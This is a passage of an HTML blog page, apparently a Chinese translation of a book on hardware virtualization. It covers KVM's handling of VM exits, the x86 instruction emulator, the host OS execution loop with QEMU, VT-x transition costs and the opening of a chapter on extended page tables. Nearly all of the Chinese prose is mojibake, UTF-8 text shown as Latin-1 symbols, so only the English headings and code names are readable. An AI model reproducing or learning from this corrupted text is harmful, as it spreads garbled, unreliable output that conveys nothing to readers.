¹æ®vmcs.exit_reasonè¿›è¡Œç¬¬ä¸€çº§è°ƒåº¦ï¼Œå¯¹æ¯ä¸ªé€€å‡ºåŸå› ï¼ˆarch/x86/kvm/vmx.cä¸­çš„<code>handler_*</code>ï¼‰ä½¿ç”¨ä¸åŒçš„å¤„ç†ç¨‹åºã€‚è¿™äº›å¤„ç†ç¨‹åºä¸­çš„å¤§å¤šæ•°éƒ½å¾ˆç®€å•ã€‚ç‰¹åˆ«æ˜¯ï¼ŒæŸäº›å¸¸è§ä»£ç è·¯å¾„ä»…ä¾èµ–äºVMCSå­—æ®µæ¥ç¡®å®šæ‰§è¡Œæ‰€éœ€çš„å¿…è¦ä»¿çœŸæ­¥éª¤ã€‚æ ¹æ®æƒ…å†µï¼ŒKVMå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>ä»¿çœŸæŒ‡ä»¤çš„è¯­ä¹‰ï¼Œå¹¶å°†æŒ‡ä»¤æŒ‡é’ˆå¢åŠ åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤çš„å¼€å¤´ï¼›</li><li>ç¡®å®šå¿…é¡»å°†æ•…éšœæˆ–ä¸­æ–­è½¬å‘åˆ°å®¢æˆ·ç¯å¢ƒã€‚æ ¹æ®x86çš„è¯­ä¹‰ï¼ŒKVMæ›´æ”¹å †æ ˆæŒ‡é’ˆï¼Œå¹¶å°†ä»¥å‰çš„æŒ‡ä»¤å’Œå †æ ˆæŒ‡é’ˆå­˜å‚¨åœ¨å †æ ˆä¸Šã€‚ç„¶åï¼Œåœ¨å®¢æˆ·çš„ä¸­æ–­æè¿°ç¬¦è¡¨æŒ‡å®šçš„æŒ‡ä»¤å¤„æ¢å¤æ‰§è¡Œï¼›</li><li>æ›´æ”¹åº•å±‚ç¯å¢ƒå¹¶é‡æ–°å°è¯•æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œåœ¨å‘ç”ŸEPTè¿è§„æ—¶ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼›</li><li>ä»€ä¹ˆéƒ½ä¸åšï¼ˆè‡³å°‘å¯¹è™šæ‹ŸæœºçŠ¶æ€æ¥è¯´ï¼‰ã€‚ä¾‹å¦‚ï¼Œå½“å‘ç”Ÿå¤–éƒ¨ä¸­æ–­æ—¶ï¼Œç”±åº•å±‚ä¸»æœºæ“ä½œç³»ç»Ÿå¤„ç†ã€‚éæ ¹æ‰§è¡Œæœ€ç»ˆä¼šåœ¨ä¸­æ–­ä¹‹å‰ä¸­æ–­çš„ä½ç½®ç»§ç»­ã€‚</li></ul><p>ä¸å¹¸çš„æ˜¯ï¼ŒVMCSä¸­å¯ç”¨çš„ä¿¡æ¯æœ‰æ—¶ä¸è¶³ä»¥å¤„ç†#vmexitï¼Œè€Œä¸å®é™…è§£ç å¼•èµ·å®ƒçš„æŒ‡ä»¤ã€‚å› æ­¤ï¼ŒKVMä»¥åŠè¯•å›¾æä¾›ç­‰æ•ˆæ€§çš„ä»»ä½•VT-xçš„è™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¿…é¡»è¿˜åŒ…æ‹¬é€šç”¨ç›®çš„çš„è§£ç å™¨ï¼Œèƒ½å¤Ÿè§£ç æ‰€æœ‰æŒ‡ä»¤ï¼Œä»¥åŠé€šç”¨ç›®çš„çš„ä»¿çœŸå™¨ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œä»¿çœŸã€‚</p><p>å›¾4.3è¿˜è¯´æ˜äº†KVMé€šç”¨ç›®çš„ä»¿çœŸå™¨å®ç°ä¸­æ¶‰åŠçš„å…³é”®æ­¥éª¤ã€‚æ‰§è¡Œè¿™ä¸ªåŸºæœ¬æ­¥éª¤çš„æ ¸å¿ƒé€»è¾‘åœ¨arch/x86/kvm/emulate.cä¸­å®ç°ï¼Œè¯¥æ–‡ä»¶æœ‰5000å¤šè¡Œä»£ç ï¼Œå……æ»¡äº†å®ã€å¤æ‚æ€§å’Œå¾®å¦™ä¹‹å¤„ã€‚ä»¿çœŸå™¨çš„å…³é”®æ­¥éª¤åŒ…æ‹¬ï¼š</p><ol><li>ä»å®¢æˆ·è™šæ‹Ÿå†…å­˜ï¼ˆ%cs:%eipï¼‰ä¸­æå–æŒ‡ä»¤ã€‚é¦–å…ˆï¼Œè™šæ‹Ÿåœ°å€å¿…é¡»è½¬æ¢ä¸ºçº¿æ€§åœ°å€ï¼Œç„¶åè½¬æ¢ä¸ºå®¢æˆ·ç‰©ç†åœ°å€ï¼Œå¹¶ä»å†…å­˜ä¸­æå–ï¼›</li><li>è§£ç æŒ‡ä»¤ï¼Œæå–å…¶æ“ä½œæ•°å’Œæ“ä½œæ•°ã€‚x86-64æŒ‡ä»¤çš„CISCæ€§è´¨å’Œå¯å˜é•¿åº¦ä½¿å¾—è¿™ä¸ªè¿‡ç¨‹ä¸æ˜¯å¾®ä¸è¶³é“çš„ï¼›</li><li>éªŒè¯æŒ‡ä»¤æ˜¯å¦å¯ä»¥åœ¨è™šæ‹ŸCPUçš„å½“å‰çŠ¶æ€ä¸‹æ‰§è¡Œï¼Œä¾‹å¦‚ï¼Œç‰¹æƒæŒ‡ä»¤åªèƒ½åœ¨è™šæ‹ŸCPUå¤„äºcpl0æ—¶æ‰§è¡Œï¼›</li><li>ä»å†…å­˜ä¸­è¯»å–ä»»ä½•å†…å­˜è¯»å–æ“ä½œæ•°ï¼Œå°±åƒåœ¨x86 CISCæ¶æ„ä¸­ä½¿ç”¨ä¸æŒ‡ä»¤è·å–ç›¸åŒçš„è™šæ‹Ÿåˆ°çº¿æ€§åˆ°å®¢æˆ·ç‰©ç†é‡å®šä½æ­¥éª¤ä¸€æ ·ï¼›</li><li>ä»¿çœŸè§£ç çš„æŒ‡ä»¤ï¼Œå¯ä»¥æ˜¯x86æ¶æ„ä¸­å®šä¹‰çš„ä»»ä½•æŒ‡ä»¤ã€‚æ¯ä¸ªæŒ‡ä»¤æ“ä½œç é€šè¿‡å…¶è‡ªå·±çš„ä¸“ç”¨ä»¿çœŸä¾‹ç¨‹ï¼ˆæºä»£ç ä¸­çš„<code>em_*</code>ï¼‰è¿›è¡Œä»¿çœŸï¼›</li><li>å°†ä»»ä½•å†…å­˜å†™æ“ä½œæ•°å†™å›å®¢æˆ·è™šæ‹Ÿæœºï¼›ä»¥åŠ</li><li>æ ¹æ®éœ€è¦æ›´æ–°å®¢æˆ·å¯„å­˜å™¨å’ŒæŒ‡ä»¤æŒ‡é’ˆã€‚</li></ol><p>æ˜¾ç„¶ï¼Œè¿™äº›æ­¥éª¤å¤æ‚ã€æ˜‚è´µï¼Œå¹¶ä¸”å……æ»¡äº†ç‰¹æ®Šæƒ…å†µå’Œå¯èƒ½çš„å¼‚å¸¸æ¡ä»¶ã€‚å›¾4.3è¿›ä¸€æ­¥æ˜¾ç¤ºäº†è¿™ç§å¤æ‚æ€§ï¼Œå› ä¸ºæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«å¯èƒ½çš„å¼‚å¸¸æƒ…å†µï¼Œåœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œé™·é˜±å’Œä»¿çœŸé€»è¾‘ä¼šå¾—å‡ºç»“è®ºï¼Œå®¢æˆ·æŒ‡ä»¤æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œè€Œåº”åœ¨å®¢æˆ·è™šæ‹ŸCPUä¸­ç”Ÿæˆæ•…éšœï¼Œä¾‹å¦‚è™šæ‹Ÿ#GPã€#PFæˆ–#UDã€‚</p><p>æ­¤å¤–ï¼Œä»¿çœŸå™¨ä»¥æŸäº›ç½•è§æƒ…å†µä¸‹å¯¹å®é™…ç¡¬ä»¶é€ æˆæ•…éšœï¼Œä¾‹å¦‚å½“é™¤ä»¥é›¶æ—¶ã€‚å›¾ä¸­ä»¥çº¢è‰²æ˜¾ç¤ºäº†è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´äº†é¢å¤–çš„å¤æ‚æ€§ã€‚</p><p>è¿™ä¸ªä»¿çœŸå™¨ä¹Ÿä»¥å…¶è„†å¼±æ€§è€Œé—»åï¼Œå®ƒçš„å®ç°éšç€æ—¶é—´çš„æ¨ç§»ä¸æ–­å‘å±•ï¼Œä»¥è§£å†³ç¼ºé™·æŠ¥å‘Šä»¥åŠæŒç»­çš„ISAæ‰©å±•ã€‚å®ƒä»ç„¶å®¹æ˜“å‡ºé”™ã€‚Amitç­‰äººæœ€è¿‘çš„ç ”ç©¶å‘ç°KVMå†…æ ¸æ¨¡å—ä¸­æœ‰117ä¸ªä»¿çœŸé”™è¯¯ï¼Œå…¶ä¸­72ä¸ªä»…åœ¨ä»¿çœŸå™¨ä¸­å‘ç°ã€‚</p><h3 id="4-3-3-THE-ROLE-OF-THE-HOST-OPERATING-SYSTEM"><a href="#4-3-3-THE-ROLE-OF-THE-HOST-OPERATING-SYSTEM" class="headerlink" title="4.3.3 THE ROLE OF THE HOST OPERATING SYSTEM"></a>4.3.3 THE ROLE OF THE HOST OPERATING SYSTEM</h3><p><img src="https://img.gls.show/img/20230904195551.png"></p><p>KVMä¸“é—¨è®¾è®¡ä¸ºLinuxçš„ä¸€éƒ¨åˆ†ã€‚ä¸å…¶ä»–ç±»å‹-2çš„è™šæ‹Ÿæœºç›‘è§†ç¨‹åºï¼ˆå¦‚VMware Workstationæˆ–VirtualBoxï¼‰ä¸åŒï¼Œå®ƒæ·±åº¦é›†æˆåˆ°Linuxç¯å¢ƒä¸­ã€‚ä¾‹å¦‚ï¼Œperfå·¥å…·åŒ…å…·æœ‰ä¸“é—¨ç”¨äºåˆ†æKVMè™šæ‹Ÿæœºçš„æ¨¡å¼ï¼›è¿™æ˜¯ç”±äºKVMå’ŒLinuxé¡¹ç›®çš„æ·±åº¦é›†æˆæ‰€å®ç°çš„ã€‚</p><p>å›¾4.4æ˜¾ç¤ºäº†æ ¸å¿ƒKVMè™šæ‹Ÿæœºæ‰§è¡Œå¾ªç¯[113]ï¼Œä»¥ä¸€ä¸ªè™šæ‹ŸCPUä¸ºä¾‹ã€‚å¤–éƒ¨å¾ªç¯ä½äºç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œé‡å¤æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>é€šè¿‡å¯¹å­—ç¬¦è®¾å¤‡/dev/kvmçš„ioctlè¿›å…¥KVMå†…æ ¸æ¨¡å—ï¼›</li><li>ç„¶åï¼ŒKVMå†…æ ¸æ¨¡å—æ‰§è¡Œå®¢æˆ·ä»£ç ï¼Œç›´åˆ°ï¼ˆiï¼‰å®¢æˆ·ä½¿ç”¨I/OæŒ‡ä»¤æˆ–å†…å­˜æ˜ å°„I/Oå‘èµ·I/Oæ“ä½œï¼Œæˆ–è€…ï¼ˆiiï¼‰ä¸»æœºæ¥æ”¶åˆ°å¤–éƒ¨I/Oæˆ–å®šæ—¶å™¨ä¸­æ–­ä¸ºæ­¢ï¼›</li><li>ç„¶åï¼ŒQEMUè®¾å¤‡ä»¿çœŸå™¨æ ¹æ®éœ€è¦æ¨¡æ‹Ÿå‘èµ·çš„I/Oï¼›</li><li>åœ¨å‘ç”Ÿå¤–éƒ¨I/Oæˆ–å®šæ—¶å™¨ä¸­æ–­çš„æƒ…å†µä¸‹ï¼Œå¤–éƒ¨å¾ªç¯å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªioctl(/dev/kvm)ç®€å•åœ°è¿”å›åˆ°KVMå†…æ ¸æ¨¡å—ï¼Œè€Œæ²¡æœ‰è¿›ä¸€æ­¥çš„å‰¯ä½œç”¨ã€‚</li></ul><p>ç„¶è€Œï¼Œè¿™ä¸€æ­¥åœ¨ç”¨æˆ·ç©ºé—´æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå› ä¸ºå®ƒä¸ºä¸»æœºæ“ä½œç³»ç»Ÿæä¾›äº†è¿›è¡Œå…¨å±€è°ƒåº¦å†³ç­–çš„æœºä¼šã€‚</p><p>å†…éƒ¨å¾ªç¯ï¼ˆåœ¨KVMå†…æ ¸æ¨¡å—å†…éƒ¨ï¼‰åå¤æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>æ¢å¤è™šæ‹ŸCPUçš„å½“å‰çŠ¶æ€ï¼›</li><li>ä½¿ç”¨vmresumeæŒ‡ä»¤è¿›å…¥éæ ¹æ¨¡å¼ã€‚åœ¨é‚£ä¸€ç‚¹ä¸Šï¼Œè™šæ‹Ÿæœºåœ¨è¯¥æ¨¡å¼ä¸‹æ‰§è¡Œï¼Œç›´åˆ°ä¸‹ä¸€ä¸ª#vmexitï¼›</li><li>æ ¹æ®é€€å‡ºåŸå› å¤„ç†#vmexitï¼Œå¦‚Â§4.3.2ä¸­æ‰€è¿°ï¼›</li><li>å¦‚æœå®¢æˆ·å‘å‡ºäº†ä¸€ä¸ªç¼–ç¨‹çš„IOæ“ä½œï¼ˆexit_reason = IOï¼‰æˆ–å†…å­˜æ˜ å°„çš„IOæŒ‡ä»¤ï¼ˆexit_reason = exceptionï¼Œä½†ä»…åœ¨è®¿é—®å†…å­˜æ˜ å°„çš„IOé¡µæ—¶ï¼‰ï¼Œåˆ™ä¸­æ–­å¾ªç¯å¹¶è¿”å›åˆ°ç”¨æˆ·ç©ºé—´ï¼›</li><li>å¦‚æœ#vmexitæ˜¯ç”±å¤–éƒ¨äº‹ä»¶å¼•èµ·çš„ï¼ˆä¾‹å¦‚ï¼Œexit_reason = interruptï¼‰ï¼Œåˆ™ä¸­æ–­å¾ªç¯å¹¶è¿”å›åˆ°ç”¨æˆ·ç©ºé—´ã€‚</li></ul><h2 id="4-4-PERFORMANCE-CONSIDERATIONS"><a href="#4-4-PERFORMANCE-CONSIDERATIONS" class="headerlink" title="4.4 PERFORMANCE CONSIDERATIONS"></a>4.4 PERFORMANCE CONSIDERATIONS</h2><p>VT-xçš„è®¾è®¡å›´ç»•ç€åœ¨æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´å¤åˆ¶ä½“ç³»ç»“æ„çŠ¶æ€ä»¥åŠåœ¨å®ƒä»¬ä¹‹é—´è¿›è¡ŒåŸå­è½¬æ¢çš„èƒ½åŠ›ã€‚å•ä¸ªæŒ‡ä»¤vmresumeè¿”å›éæ ¹æ¨¡å¼å¹¶å°†VMCSçŠ¶æ€åŠ è½½åˆ°å½“å‰å¤„ç†å™¨çŠ¶æ€ä¸­ã€‚</p><p>å¦ä¸€æ–¹å‘ä¸Šï¼Œé™·å…¥#vmexitå°†æ•´ä¸ªè™šæ‹ŸCPUçš„çŠ¶æ€å­˜å‚¨åˆ°VMCSçŠ¶æ€ä¸­ã€‚ æ¨¡å¼ä¹‹é—´çš„åŸå­è½¬æ¢å¹¶ä¸æ„å‘³ç€é«˜æ‰§è¡Œé€Ÿåº¦ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯å•å‘¨æœŸçš„æ‰§è¡Œæ—¶é—´ã€‚ç›´è§‚åœ°è¯´ï¼Œè¿™ç§è½¬æ¢é¢„è®¡ä¼šæš‚åœæ•´ä¸ªæ‰§è¡Œæµæ°´çº¿ï¼Œå› ä¸ºæ•´ä¸ªå¯„å­˜å™¨æ–‡ä»¶ã€ç‰¹æƒçŠ¶æ€å’ŒæŒ‡ä»¤æŒ‡é’ˆéƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚ å®é™…ä¸Šï¼Œè¿™äº›è½¬æ¢çš„æµ‹å¾—æˆæœ¬å¾ˆé«˜ï¼Œå¹¶ä¸”è¡¨æ˜åœ¨å¤„ç†å™¨çš„å¾®ç å›ºä»¶ä¸­å­˜åœ¨å¤æ‚çš„å®ç°ã€‚è¡¨4.2æ˜¾ç¤ºäº†ç¡¬ä»¶å¾€è¿”çš„æˆæœ¬ï¼Œå®šä¹‰ä¸º#vmexitåç”±è™šæ‹Ÿæœºç›‘è§†ç¨‹åºä¸­çš„NULLå¤„ç†å™¨æ‰§è¡Œçš„æŒ‡ä»¤æŒ‡é’ˆå¢åŠ å¹¶æ¢å¤è™šæ‹Ÿæœºçš„æ‰§è¡Œã€‚åœ¨æ—©æœŸçš„å¤„ç†å™¨ä¸­ï¼Œä¾‹å¦‚Prescottï¼Œå•ä¸ªç¡¬ä»¶å¾€è¿”çš„æˆæœ¬ä»¥å¾®ç§’ä¸ºå•ä½æµ‹å¾—ï¼Œè¿œè¿œè¶…è¿‡å¸¸è§„é™·é˜±çš„æˆæœ¬ã€‚ä»é‚£ä»¥åï¼Œè½¬æ¢å·²ç»æ”¹è¿›äº†5å€ï¼Œä½†ä»ç„¶å¾ˆé«˜ã€‚</p><p>Amitç­‰äººåœ¨ä»–ä»¬çš„ç ”ç©¶ä¸­[15]å‘ç°äº†ä¸€äº›å…³äºVT-xæ˜¯å¦ç¬¦åˆPopek/Goldbergå®šç†çš„æ¬¡è¦ç¡¬ä»¶é™åˆ¶ï¼šç‰©ç†åœ°å€å®½åº¦å¯ä»¥ç›´æ¥é€šè¿‡CPUIDæŒ‡ä»¤è·å¾—ï¼Œè€Œæ— æ³•è™šæ‹ŸåŒ–ã€‚å½“åœ¨å…·æœ‰ä¸åŒç‰©ç†åœ°å€å®½åº¦çš„ç³»ç»Ÿä¹‹é—´è¿›è¡Œè™šæ‹Ÿæœºçš„å®æ—¶è¿ç§»æ—¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ã€‚æ­¤å¤–ï¼Œä¸€äº›FPUçŠ¶æ€æ— æ³•å®Œå…¨è™šæ‹ŸåŒ–ï¼Œéœ€è¦é‡‡å–è§£å†³æ–¹æ³•ã€‚</p><h2 id="4-5-FURTHER-READING"><a href="#4-5-FURTHER-READING" class="headerlink" title="4.5 FURTHER READING"></a>4.5 FURTHER READING</h2><p>åœ¨åŒä¸€é¡¹ç ”ç©¶ä¸­ï¼ŒAmitç­‰äººä¸»è¦ç¡®å®šäº†KVMå®ç°ä¸­è¿åäº†é¢„æœŸçš„è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„å®‰å…¨ç­‰æ•ˆæ€§å±æ€§çš„è½¯ä»¶é”™è¯¯ã€‚é€šè¿‡ç³»ç»Ÿæ¯”è¾ƒKVMè™šæ‹Ÿæœºä¸è‹±ç‰¹å°”çš„å‚è€ƒæ¨¡æ‹Ÿå™¨[15]çš„è¡Œä¸ºï¼Œä»–ä»¬ç¡®å®šäº†KVMä¸­çš„117ä¸ªä¸åŒé”™è¯¯ã€‚è¿™äº›é”™è¯¯çš„å…±åŒåŸå› æ˜¯x86 ISAçš„å¤æ‚æ€§å®Œå…¨æš´éœ²ç»™äº†è½¯ä»¶ã€‚å°½ç®¡è¿™äº›é”™è¯¯ä¸­çš„å¤§å¤šæ•°éƒ½æ˜¯åœ¨å®é™…ä¸­å½±å“ä¸å¤§çš„è¾¹ç¼˜æ¡ˆä¾‹ç­‰æ•ˆæ€§é™åˆ¶ï¼Œä½†è‡³å°‘æœ‰6ä¸ªé”™è¯¯å¯¼è‡´äº†å®‰å…¨æ¼æ´ï¼Œå¯èƒ½å¯¼è‡´ä¸»æœºDoSã€è™šæ‹ŸæœºDoSæˆ–ç‰¹æƒå‡çº§ã€‚è¿™äº›é—®é¢˜è¦æ±‚é‡æ–°è®¾è®¡KVMå†…æ ¸æ¨¡å—ï¼Œç‰¹åˆ«æ˜¯è€ƒè™‘å°†æŒ‡ä»¤æ¨¡æ‹Ÿå™¨ç§»åŠ¨åˆ°ç”¨æˆ·ç©ºé—´ï¼Œä»¥ä¾¿æ›´å®¹æ˜“åœ°éš”ç¦»é”™è¯¯[37]ã€‚</p><p>å¯¹KVMæœ‰æ›´æ·±å…¥äº†è§£å…´è¶£çš„è¯»è€…å¾ˆå¿«ä¼šå‘ç°ï¼Œæºä»£ç æ˜¯æœ€å¥½çš„æ–‡æ¡£å½¢å¼ï¼Œå°½ç®¡KVMç½‘ç«™[118]ä¸­ä¹ŸåŒ…å«äº†ä¸€äº›æœ‰ç”¨çš„æŒ‡å¯¼ã€‚</p><p>è‡ªä»ç¡…ä¸­å¼•å…¥VT-xä»¥æ¥ï¼Œx86æ¶æ„çš„æ‰€æœ‰è™šæ‹Ÿæœºç›‘è§†ç¨‹åºéƒ½å·²ç»é‡‡ç”¨äº†VT-xã€‚å½“å‰ç‰ˆæœ¬çš„VMware Workstationç±»ä¼¼äºKVMï¼Œåˆ©ç”¨äº†VT-xçš„MMUåŠŸèƒ½ï¼šä¸–ç•Œåˆ‡æ¢ä¸å†ä»¥å…¶åŸå§‹å½¢å¼å­˜åœ¨ï¼ŒVMware Workstationçš„æ ¸å¿ƒæ‰§è¡Œå¾ªç¯ä¸KVMç±»ä¼¼ã€‚Adamså’ŒAgesen[3]åœ¨ç¡¬ä»¶æ”¯æŒå­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œè¯¦ç»†ç ”ç©¶äº†åœ¨DBTå’Œç›´æ¥æ‰§è¡Œä¹‹é—´çš„è¿™ç§æƒè¡¡ã€‚æ¯å½“è™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¿…é¡»åœ¨å†…å­˜ä¸­å½±å­å¤åˆ¶åœ¨å®é™…ä¸­é¢‘ç¹è®¿é—®çš„æ•°æ®ç»“æ„æ—¶ï¼Œè¿™ç§æƒè¡¡å°±ä¼šå¾ˆå¤§ã€‚åœ¨æ‰©å±•é¡µå¤„ç†å™¨å¼•å…¥ä¹‹å‰ï¼Œè¿™ç§æƒè¡¡æ˜¯åŸºæœ¬çš„ï¼Œä½œè€…å¾—å‡ºç»“è®ºç§°VT-xï¼ˆä¸åŒ…æ‹¬æ‰©å±•åˆ†é¡µï¼‰ä¼šå½±å“æ€§èƒ½ã€‚</p><p>Xenä¹Ÿæ—©æ—©é‡‡ç”¨äº†VT-xï¼Œç§°ä¸ºç¡¬ä»¶è™šæ‹ŸåŒ–ï¼ˆHVMï¼‰[50, 146]ã€‚ä½¿ç”¨HVMï¼Œè™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿä¸å†éœ€è¦è¿›è¡ŒparavirtualåŒ–æ‰èƒ½åœ¨Xenä¸Šè¿è¡Œã€‚ç›¸åï¼Œparavirtualizationåªæ˜¯ä¸€ç»„å¯é€‰çš„æ‰©å±•ï¼Œé€šè¿‡ä¸è™šæ‹Ÿæœºç›‘è§†ç¨‹åºç›´æ¥é€šä¿¡æ¥æé«˜æ€§èƒ½å’ŒåŠŸèƒ½ã€‚</p><p>å°±æˆ‘ä»¬æ‰€çŸ¥ï¼Œä»æ ¹æ¨¡å¼åˆ°éæ ¹æ¨¡å¼çš„è¿‡æ¸¡çš„å¾®ä½“ç³»ç»“æ„æˆæœ¬ä»æœªåœ¨å­¦æœ¯ä¸Šæ·±å…¥ç ”ç©¶è¿‡ï¼Œä¹Ÿæ²¡æœ‰æŠ«éœ²åœ¨è‹±ç‰¹å°”æˆ–AMDå¤„ç†å™¨ä¸­çš„å…¶å®æ–½çš„æ˜¾è¦æ–¹é¢ã€‚ä»Prescottåˆ°Sandy Bridgeçš„5å€æ”¹è¿›çš„åŸå› ä»ç„¶æ˜¯ä¸€ä¸ªå¼•å‘çŒœæµ‹çš„é—®é¢˜ã€‚ç›¸åï¼Œç„¦ç‚¹ä¸€ç›´æ˜¯ä¸æ‡ˆå‡å°‘å¤„ç†#vmexitçš„è½¯ä»¶æˆæœ¬ã€‚</p><p><img src="https://img.gls.show/img/20230904201029.png"></p><blockquote><p>Table4.3: Hardware costs of individual VT-x instructions and <code>#vmexit</code> for different Intel processors</p></blockquote><h1 id="X86-64-å¸¦æ‰©å±•é¡µè¡¨çš„-MMU-è™šæ‹ŸåŒ–"><a href="#X86-64-å¸¦æ‰©å±•é¡µè¡¨çš„-MMU-è™šæ‹ŸåŒ–" class="headerlink" title="X86-64: å¸¦æ‰©å±•é¡µè¡¨çš„ MMU è™šæ‹ŸåŒ–"></a>X86-64: å¸¦æ‰©å±•é¡µè¡¨çš„ MMU è™šæ‹ŸåŒ–</h1><p>è™šæ‹Ÿæœºç›‘æ§ç¨‹åºå¿…é¡»è™šæ‹ŸåŒ–ç‰©ç†å†…å­˜ï¼Œä»¥ä¾¿æ¯ä¸ªè™šæ‹Ÿæœºéƒ½å…·æœ‰ç®¡ç†è‡ªå·±è¿ç»­ç‰©ç†å†…å­˜åŒºåŸŸçš„é”™è§‰ã€‚å›æƒ³ä¸€ä¸‹ç¬¬1.6èŠ‚çš„å®šä¹‰ï¼šæ¯ä¸ªè™šæ‹Ÿæœºéƒ½æä¾›äº†å®¢æˆ·ç‰©ç†å†…å­˜çš„æŠ½è±¡ï¼Œè€Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºç®¡ç†ä¸»æœºç‰©ç†å†…å­˜ï¼Œå³å®é™…çš„åº•å±‚ç‰©ç†èµ„æºã€‚</p><p>è¿™å¯¼è‡´äº†ä¸€ä¸ªäºŒç»´é—®é¢˜ï¼šå®¢æˆ·æ“ä½œç³»ç»Ÿå®šä¹‰äº†è™šæ‹Ÿå†…å­˜å’Œå®¢æˆ·ç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ã€‚è™šæ‹Ÿæœºç›‘æ§ç¨‹åºç„¶åç‹¬ç«‹åœ°å®šä¹‰äº†å®¢æˆ·ç‰©ç†å†…å­˜å’Œä¸»æœºç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ã€‚</p><p>åœ¨<strong>å†…å­˜ç®¡ç†å•å…ƒä¸­æ²¡æœ‰ä»»ä½•æ¶æ„æ”¯æŒçš„æƒ…å†µä¸‹</strong>ï¼Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºä¾èµ–äºé˜´å½±åˆ†é¡µæ¥è™šæ‹ŸåŒ–å†…å­˜ã€‚<strong>åœ¨é˜´å½±åˆ†é¡µä¸­ï¼Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºç®¡ç†ä¸€ç»„ç»¼åˆçš„é¡µè¡¨ï¼Œå°†è™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°ä¸»æœºç‰©ç†å†…å­˜</strong>ï¼ˆæœ‰å…³VMwareå®ç°çš„æè¿°ï¼Œè¯·å‚è§Â§3.2.5ï¼‰ã€‚ä½œä¸ºåœ¨è½¯ä»¶ä¸­å®ç°çš„é˜´å½±åˆ†é¡µå¯èƒ½æ˜¯è™šæ‹Ÿæœºç›‘æ§ç¨‹åºä¸­æœ€å¤æ‚çš„å­ç³»ç»Ÿã€‚å®ƒä¾èµ–äºå†…å­˜è·Ÿè¸ªæ¥è·Ÿè¸ªå†…å­˜ä¸­çš„é¡µè¡¨ç»“æ„çš„æ›´æ”¹ã€‚é˜´å½±åˆ†é¡µè¿˜ä¸¥é‡ä¾èµ–äºå¯å‘å¼æ–¹æ³•æ¥ç¡®å®šå“ªäº›é¡µé¢åº”è¯¥è¢«è·Ÿè¸ªï¼Œå› ä¸ºé¡µè¡¨å¯ä»¥ä½äºç‰©ç†å†…å­˜çš„ä»»ä½•ä½ç½®ï¼Œå¹¶ä¸”å¯ä»¥ç”±å®¢æˆ·æ“ä½œç³»ç»Ÿè‡ªè¡Œåˆ†é…å’Œé‡æ–°åˆ†é…ã€‚æ­¤å¤–ï¼ŒVT-xçš„å¼•å…¥å¯¹é˜´å½±åˆ†é¡µçš„æ€§èƒ½äº§ç”Ÿäº†è´Ÿé¢å½±å“ï¼ˆè¯·å‚è§Â§4.2.3ï¼‰ã€‚</p><p>æ‰©å±•é¡µè¡¨ä¸ºMMUè™šæ‹ŸåŒ–æä¾›äº†ä½“ç³»ç»“æ„æ”¯æŒã€‚ç¬¬5.1èŠ‚æè¿°äº†x86-64å¤„ç†å™¨ä¸­æ‰©å±•åˆ†é¡µçš„è®¾è®¡ã€‚ç¬¬5.2èŠ‚æè¿°äº†KVMå¦‚ä½•ç®¡ç†å’Œè™šæ‹ŸåŒ–å†…å­˜ï¼Œå¹¶åˆ©ç”¨æ‰©å±•é¡µè¡¨ã€‚ç¬¬5.3èŠ‚è¡¡é‡äº†MMUè™šæ‹ŸåŒ–çš„æˆæœ¬ã€‚æœ€åï¼Œä¸æ‰€æœ‰ç« èŠ‚ä¸€æ ·ï¼Œæˆ‘ä»¬æä¾›äº†è¿›ä¸€æ­¥é˜…è¯»çš„æŒ‡å—ã€‚</p><h2 id="5-1-æ‰©å±•åˆ†é¡µ"><a href="#5-1-æ‰©å±•åˆ†é¡µ" class="headerlink" title="5.1 æ‰©å±•åˆ†é¡µ"></a>5.1 æ‰©å±•åˆ†é¡µ</h2><blockquote><ul><li><strong>æ‰©å±•é¡µè¡¨</strong>ï¼šæ‰©å±•é¡µè¡¨æ˜¯ç¡¬ä»¶è¾…åŠ©çš„å†…å­˜è™šæ‹ŸåŒ–æ–¹æ³•ã€‚å®ƒåˆ©ç”¨å¤„ç†å™¨çš„ç¡¬ä»¶ç‰¹æ€§æ¥ç®¡ç†è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„æ˜ å°„ã€‚å¤„ç†å™¨æä¾›äº†é¢å¤–çš„ç¡¬ä»¶ç»“æ„ï¼ˆé€šå¸¸æ˜¯å¤šçº§é¡µè¡¨ï¼‰ï¼Œç”¨äºç›´æ¥ç®¡ç†è¿™äº›æ˜ 